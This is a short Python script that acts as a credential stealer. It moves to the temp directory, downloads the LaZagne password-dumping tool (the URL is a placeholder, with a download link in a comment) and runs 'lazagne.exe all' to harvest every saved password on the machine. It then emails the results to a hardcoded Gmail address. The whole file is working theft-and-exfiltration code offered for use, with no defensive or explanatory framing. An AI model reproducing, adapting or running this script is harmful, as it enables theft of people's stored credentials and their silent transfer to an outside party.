import requests,subprocess,smtplib,os,tempfile

def download(url):
    get_response=requests.get(url)
    file_name=url.split("/")[-1]
    with open(file_name,"wb") as out_file:

        out_file.write(get_response.content)

def sendEmail(email,password,message):
    server=smtplib.SMTP("smtp.google.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def main():
    temp_directory= tempfile.gettempdir()
    os.chdir(temp_directory)
    download("linklazagneDownload") # https://www.softpedia.com/dyn-postdownload.php/d3b7ec73e6aae03f099c7cda7b79120a/5f7b8b36/3de5c/0/1
    response=subprocess.check_output("lazagne.exe all",shell=True)
    sendEmail("krikoacaso@gmail.com","12345678",response)


if __name__ == '__main__':
    main()
